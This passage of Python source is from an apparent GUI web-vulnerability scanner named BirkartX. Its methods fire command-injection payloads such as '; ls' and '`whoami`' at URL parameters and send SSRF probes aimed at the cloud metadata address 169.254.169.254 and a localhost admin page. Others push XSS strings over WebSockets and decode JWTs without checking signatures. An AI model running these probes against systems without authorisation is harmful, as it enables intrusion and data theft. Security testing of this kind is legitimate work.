            self.log("lfi", f"Error: {str(e)}", "fail")
        self.is_running["lfi"] = False

    def logic_cmd(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cmd", "Command injection scanning...")
        payloads = ["; ls", "| dir", "& id", "`whoami`"]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("cmd", "No parameters found for command injection.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for payload in payloads:
                        if not self.is_running["cmd"]: break
                        test_qs = urllib.parse.urlencode({param: payload})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        resp = requests.get(test_url, headers=self.agent, timeout=5, verify=False)
                        if any(x in resp.text.lower() for x in ["root:x", "uid=", "windows directory"]):
                            self.log("cmd", f"VULNERABLE (Command Injection): {test_url}", "vuln")
                            vulnerable = True
                            break
                if not vulnerable:
                    self.log("cmd", "No command injection vulnerabilities found.", "fail")
        except Exception as e:
            self.log("cmd", f"Error: {str(e)}", "fail")
        self.is_running["cmd"] = False

    def logic_ssrf(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("ssrf", "SSRF scanning...")
        internal_targets = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("ssrf", "No parameters found for SSRF testing.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for itarget in internal_targets:
                        if not self.is_running["ssrf"]: break
                        test_qs = urllib.parse.urlencode({param: itarget})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        resp = requests.get(test_url, headers=self.agent, timeout=6, verify=False)
                        if "ami-id" in resp.text or "root" in resp.text:
                            self.log("ssrf", f"VULNERABLE (SSRF): {test_url}", "vuln")
                            vulnerable = True
                            break
                if not vulnerable:
                    self.log("ssrf", "No SSRF vulnerabilities found.", "fail")
        except Exception as e:
            self.log("ssrf", f"Error: {str(e)}", "fail")
        self.is_running["ssrf"] = False

    def logic_wsfuzz(self, target):
        url = target if target.startswith("ws") else "ws://" + target
        self.log("wsfuzz", "WebSocket fuzzing...")
        payloads = ["'", "\"", "<script>alert(1)</script>"]
        try:
            ws = websocket.create_connection(url, timeout=5)
            self.log("wsfuzz", f"Connected to {url}", "ok")
            for payload in payloads:
                if not self.is_running["wsfuzz"]: break
                self.log("wsfuzz", f"Sending: {payload}")
                ws.send(payload)
                try:
                    response = ws.recv()
                    self.log("wsfuzz", f"Response: {response[:100]}", "info")
                except:
                    pass
            ws.close()
        except Exception as e:
            self.log("wsfuzz", f"WebSocket error: {str(e)}", "fail")
        self.is_running["wsfuzz"] = False

    # ========================== SYSTEM UTILS ==========================
    def logic_arch(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("arch", f"Exploit architecture for: {url}")
        try:
            r = requests.get(url, headers=self.agent, timeout=10, verify=False)
            srv = r.headers.get('Server', 'Unknown')
            powered = r.headers.get('X-Powered-By', 'Unknown')
            self.log("arch", f"Server: {srv}", "ok")
            self.log("arch", f"X-Powered-By: {powered}", "ok")
        except Exception as e:
            self.log("arch", f"Error: {str(e)}", "fail")
        self.is_running["arch"] = False

    def logic_jwt(self, target):
        self.log("jwt", "JWT Token Exploiter - Enter a JWT token in the target field.")
        token = target.strip()
        if not token or '.' not in token:
            self.log("jwt", "Invalid JWT token format.", "fail")
            self.is_running["jwt"] = False
            return
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            self.log("jwt", f"Header: {json.dumps(header, indent=2)}", "info")
            self.log("jwt", f"Payload: {json.dumps(payload, indent=2)}", "info")
        except Exception as e:
            self.log("jwt", f"Error: {str(e)}", "fail")
        self.is_running["jwt"] = False

    def logic_report(self, _):
        fn = f"birkartx_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(self.session_results))
        self.log("report", f"Report saved: {fn}", "ok")
        self.is_running["report"] = False

if __name__ == "__main__":
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("dark-blue")
    app = BirkartX()
    app.mainloop()